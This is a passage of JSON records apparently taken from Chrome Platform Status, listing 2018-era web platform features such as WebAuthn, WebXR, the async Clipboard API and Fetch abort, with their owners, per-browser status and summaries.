        "webview": 67,
        "blink_components": [
          "Blink>Network>StreamsAPI"
        ],
        "desktop": 67,
        "flag": false,
        "android": 67,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=780689",
        "intervention": false
      },
      "opera": {
        "android": 54,
        "desktop": 54
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "TransformStream is part of the Streams API for creating, composing, and consuming streams of data. It enables transforming data in stream form. It is typically used in a pipe between a ReadableStream and a WritableStream.",
    "id": 5466425791610880,
    "resources": {
      "docs": [
        "https://streams.spec.whatwg.org/#ts-intro"
      ],
      "samples": [
        "https://streams.spec.whatwg.org/demos/"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-04-30 17:59:31.789800",
      "by": "jmedley@google.com"
    },
    "name": "Three new network quality client hints",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 67
        },
        "owners": [
          "tbansal@chromium.org",
          "igrigorik@chromium.org",
          "bengr@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Loader"
        ],
        "desktop": 67,
        "flag": true,
        "android": 67,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=826950",
        "intervention": false
      },
      "opera": {
        "android": 54,
        "desktop": 54
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Three new client hints (and corresponding HTTP request headers) were added to convey the HTTP client's network connection speed. \r\n\r\nThe headers surface the same data as the Network Information API to make it easy to make network speed-related decisions. The three new headers are “rtt”, “downlink” and “ect” and they provide the same value as existing NetInfo APIs (navigator.connection.rtt, navigator.connection.downlink and navigator.connection.effectiveType, respectively).",
    "id": 5407907378102272,
    "resources": {
      "samples": [
        "https://bit.ly/client-hints-demo"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-06-22 15:20:16.512705",
      "by": "kpaulhamus@chromium.org"
    },
    "name": "Web Authentication API for Chrome",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/webauthn/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 67
        },
        "owners": [
          "engedy@chromium.org",
          "kpaulhamus@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WebAuthentication"
        ],
        "desktop": 67,
        "flag": false,
        "bug": "https://crbug.com/664630",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The Credential Management API (Chrome 51 and later) defined a framework for retrieving credentials, including semantics for creating, getting, and storing them. It did this through two credential types: PasswordCredential and FederatedCredential. The Web Authentication API adds a third credential type, PublicKeyCredential, which allows web applications to  create and use strong, cryptographically attested, and application-scoped credentials to strongly authenticate users.",
    "id": 5669923372138496,
    "resources": {}
  },
  {
    "category": "User input",
    "updated": {
      "when": "2018-05-03 23:37:27.375910",
      "by": "jmedley@google.com"
    },
    "name": "WebXR Device API",
    "tags": [
      "XR",
      "VR",
      "AR",
      "Virtual Reality",
      "Augmented Reality"
    ],
    "comments": "This API was previously referred to as \"WebVR 2.0\", and there may still be references to it under that name.\r\n\r\nNote: If you are participating in the WebVR Origin Trial that has been available in Chrome since version 62, you cannot use your existing token for the WebXR Origin Trial.\r\n\r\nThis feature requires enabling the following item in chrome://flags.\r\n#webxr",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://immersive-web.github.io/webxr/",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Origin trial",
          "val": 8,
          "milestone_str": 67
        },
        "owners": [
          "bajones@chromium.org",
          "meganlindsay@chromium.org"
        ],
        "prefixed": false,
        "origintrial": true,
        "blink_components": [
          "Blink>WebVR"
        ],
        "desktop": 67,
        "flag": false,
        "android": 67,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=779691",
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Provides access to input and output capabilities commonly associated with Virtual Reality (VR) and Augmented Reality (AR) functionality.\r\n\r\nThis API is intended to completely replace the WebVR API (https://www.chromestatus.com/feature/4532810371039232). It has been designed to address the issues found in the prior API based on developer, web platform, hardware manufacturer, and implementer feedback.\r\n\r\nAn origin trial is expected to start in Chrome 67.",
    "id": 5680169905815552,
    "resources": {
      "docs": [
        "https://immersive-web.github.io/webxr-reference/",
        "https://github.com/immersive-web/webxr/blob/master/explainer.md",
        "https://developers.google.com/web/fundamentals/vr/status/"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-03-12 11:59:25.207460",
      "by": "jmedley@google.com"
    },
    "first_of_milestone": true,
    "name": "Add autocomplete attribute to <textarea> and <select>",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/form-elements.html#the-select-element",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "shanmuga.m@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>Forms"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=758078",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add autocomplete attribute to <textarea> and <select> as per spec.\r\n\r\nhttps://html.spec.whatwg.org/multipage/form-elements.html#the-select-element, https://html.spec.whatwg.org/multipage/form-elements.html#the-textarea-element",
    "id": 5680387573415936,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-03-12 11:56:48.855580",
      "by": "jmedley@google.com"
    },
    "name": "Aligning U2F attestation with webauthn",
    "comments": "Chrome is implementing the W3C webauthn[2] specification which will ultimately subsume U2F support. As part of that transition we are aligning attestation behaviour between webauthn and the pseudo-U2F support. For details, see https://www.chromium.org/security-keys.\r\n\r\n\r\n[2] https://www.chromestatus.com/feature/5669923372138496",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "agl@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WebAuthentication"
        ],
        "desktop": 66,
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=793985",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Chrome has never supported the FIDO U2F API directly[1]. However, it does ship with an internal extension and it's possible to implement the U2F API by using postMessage to send messages to this extension.\r\n\r\n(Description continued in comments.)\r\n\r\n[1] https://fidoalliance.org/specs/fido-u2f-v1.2-ps-20170411/fido-u2f-javascript-api-v1.2-ps-20170411.html",
    "id": 5667614588141568,
    "resources": {
      "docs": [
        "https://www.chromium.org/security-keys"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-02-09 23:09:16.715870",
      "by": "gsathya@chromium.org"
    },
    "name": "Array.prototype.values",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://tc39.github.io/ecma262/#sec-array.prototype.values",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "gsathya@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>JavaScript>Language"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=4247",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The values() method returns a new Array Iterator object that contains the values for each index in the array.\r\n\r\nvar",
    "id": 4755812090118144,
    "resources": {
      "samples": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/values"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2018-03-15 18:30:00.652230",
      "by": "jasonjmiller@google.com"
    },
    "name": "Asynchronous Clipboard API",
    "tags": [
      "asynchronous",
      "clipboard",
      "cut",
      "copy",
      "paste",
      "text"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/clipboard-apis/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "garykac@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>DataTransfer"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=677564",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "A modern, asynchronous Clipboard API based on Promises.\r\n\r\nText-only APIs (clipboard.readText and clipboard.writeText):\r\n* Behind a flag in M62\r\n* Enabled by default in M66\r\n\r\nSupport for images and other data types is still under development.\r\n",
    "id": 5861289330999296,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2018/03/clipboardapi",
        "https://github.com/w3c/clipboard-apis/blob/master/explainer.adoc"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/async-clipboard/"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2018-01-25 18:10:47.035730",
      "by": "rlanday@google.com"
    },
    "name": "Autocapitalize support on all editable elements and on <form> elements",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/interaction.html#autocapitalization",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1425291",
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "rlanday@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>HTML"
        ],
        "flag": false,
        "android": 66,
        "bug": "https://crbug.com/776618",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/15102197/",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=164538",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Improve compatibility with Safari’s implementation of autocapitalize by:\r\n\r\n- Supporting autocapitalize attribute on any contenteditable element\r\n\r\n- Allow specifying the autocapitalize attribute on a <form> element to have it apply to all child form fields\r\n",
    "id": 4974738740871168,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1pBwWacGm8GsPHCJDbJ3PZ2l1ywz_dACO3sMh5hUmD7E/edit?usp=sharing"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-05-14 19:49:10.673040",
      "by": "toyoshim@chromium.org"
    },
    "name": "Background Tab Resource Load Throttling",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 66
        },
        "owners": [
          "toyoshim@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>Loader"
        ],
        "desktop": 66,
        "flag": true,
        "android": 66,
        "bug": "http://crbug.com/723233",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "In background tabs, the maximum number of active resource loading requests is limited.\r\nThe limit can be different for the top frame, and other sub-frames.\r\n\r\nWebSockets, WebRTC's data channel, and Fetch API can be used beyond the limit.\r\n\r\nThis feature is under experiments, and may be enabled on Chrome 66.\r\nFrom Chrome 68, XMLHttpRequest and EventSource can be too.",
    "id": 5527160148197376,
    "resources": {}
  },
  {
    "category": "Houdini",
    "updated": {
      "when": "2018-03-28 19:30:06.321570",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS Typed OM (Houdini)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://drafts.css-houdini.org/css-typed-om/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1278697",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "shend@chromium.org",
          "nainar@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://crbug.com/545318",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "url": "https://lists.w3.org/Archives/Public/public-houdini/2015Oct/0011.html",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "The new CSSOM provides typed style access for developers. This will  generally improve performance primarily by removing the need to do lots of string parsing. In addition to this, it will enable performant development of various new Houdini specifications (including custom properties, layout and paint).\r\n\r\nOnly a subset of CSS properties are supported for now:\r\nhttps://chromium.googlesource.com/chromium/src/+/master/third_party/WebKit/Source/core/css/cssom/README.md",
    "id": 5682491075592192,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2018/03/cssom",
        "https://docs.google.com/document/d/1a4gFI-iFv5uA3SskHMrt-ZphCJTbNda9U78xlHmektA/view"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-01-25 13:54:04.703610",
      "by": "cnardi@chromium.org"
    },
    "name": "CSS calc() in media queries",
    "tags": [
      "media",
      "query",
      "calc"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://drafts.csswg.org/css-values-4/#calc-notation",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1256575",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "cnardi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=421909",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/15515851/",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=181716",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "According to the CSS Values 4 spec, math functions such as calc() should be allowed wherever individual CSS values such as numbers are allowed. However, calc() expressions are not currently parsed in media queries. This change would introduce support for parsing calc() expressions inside of media queries.",
    "id": 5643732019838976,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/calc",
        "https://developer.mozilla.org/en-US/docs/Web/CSS/Media_Queries/Using_media_queries"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-03-02 15:10:20.422870",
      "by": "smcgruer@google.com"
    },
    "name": "Do not throw on unimplemented but valid keyframe-specific composite values.",
    "tags": [
      "animation",
      "animate",
      "composite"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://drafts.csswg.org/web-animations-1/",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "smcgruer@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "ios": 66,
        "blink_components": [
          "Blink>Animation"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "http://crbug.com/806139",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "By spec, the following should not throw even if additive/accumulative animations are not yet supported by the browser:\r\n\r\n// Currently throws on Chrome - should not!\r\nelement.animate(\r\n  [\r\n    { color: 'red', composite: 'accumulate' },\r\n    { color: 'blue', composite: 'add' }\r\n  ], 2000);\r\n);\r\n\r\nFirefox does not throw in this case.",
    "id": 5756742138855424,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-07 21:48:40.597470",
      "by": "mathiasb@google.com"
    },
    "name": "ECMAScript ⊃ JSON",
    "tags": [
      "json",
      "string literals",
      "unicode"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://github.com/tc39/proposal-json-superset",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>JavaScript>Language"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=7418",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://developer.apple.com/safari/technology-preview/release-notes/#Release%2049",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "A Stage 3 proposal makes ECMAScript a syntactic superset of JSON by allowing line separator (U+2028) and paragraph separator (U+2029) in string literals.",
    "id": 6102319234023424,
    "resources": {}
  },
  {
    "category": "Device",
    "updated": {
      "when": "2018-02-05 17:26:56.686590",
      "by": "ericbidelman@google.com"
    },
    "name": "Feature Policy: control over Device Orientation API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://www.w3.org/TR/orientation-event/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=686401",
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "mikhail.pozdnyakov@intel.com",
          "alexander.shalamov@intel.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>FeaturePolicy"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://crbug.com/796894",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=150072",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The sensor policy-controlled features are used to control access to a device sensors requested through an event specified in the DeviceOrientation Event Specification. By default, the deviceorientation, deviceorientationabsolute and devicemotion events will be restricted to top-level document and same-origin subframes (it follows from features default allow list 'self'). The default behavior can be modified by explicitly enabling or disabling of the dedicated sensor policy-controlled features.",
    "id": 5758486868656128,
    "resources": {
      "docs": [
        "https://github.com/WICG/feature-policy/blob/gh-pages/features.md#sensor-features",
        "https://w3c.github.io/sensors/#feature-policy-api"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-03-01 08:38:22.137900",
      "by": "ricea@chromium.org"
    },
    "name": "Fetch API: AbortSignal and AbortController",
    "tags": [
      "Cancellation",
      "cancel",
      "AbortSignal",
      "AbortController"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://fetch.spec.whatwg.org/#ref-for-dom-request-signal",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/57",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "ricea@chromium.org",
          "tyoshino@chromium.org",
          "yhirano@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>Network>FetchAPI"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=750599",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/13009916/",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://svn.webkit.org/repository/webkit/releases/Apple/Safari%20Technology%20Preview%2049/WebCore/dom/AbortController.idl",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "A fetch() can be made cancellable by passing an AbortSignal \"signal\" in the fetch options. Calling abort() on the associated AbortController will then cancel the fetch.",
    "id": 5631483679080448,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/AbortSignal",
        "https://developer.mozilla.org/en-US/docs/Web/API/AbortController"
      ],
      "samples": [
        "https://developers.google.com/web/updates/2017/09/abortable-fetch"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-02-21 06:18:56.729340",
      "by": "yhirano@chromium.org"
    },
    "name": "Fetch API: keepalive",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://fetch.spec.whatwg.org/#ref-for-dom-request-keepalive",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1342484",
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "yhirano@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>Network"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://crbug.com/695939",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=168865",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This option instructs fetch() to perform resource fetching with the keepalive flag set for non-blocking event reporting, analytics, etc. as well as the Beacon API (SendBeacon).\r\n",
    "id": 5760375567941632,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1iHJtFa3jOo5n9QXHb6Ok5nK8kavXSk2DrLoubPWi9ys/edit"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-01-31 23:16:44.804720",
      "by": "adamk@chromium.org"
    },
    "name": "Function.prototype.toString revision",
    "tags": [
      "javascript",
      "es6",
      "ecmascript",
      "es7",
      "esnext",
      "es8"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://tc39.github.io/Function-prototype-toString-revision/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1317400",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "jwolfe@igalia.com",
          "adamk@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>JavaScript>Runtime"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=4958",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/pull/977",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
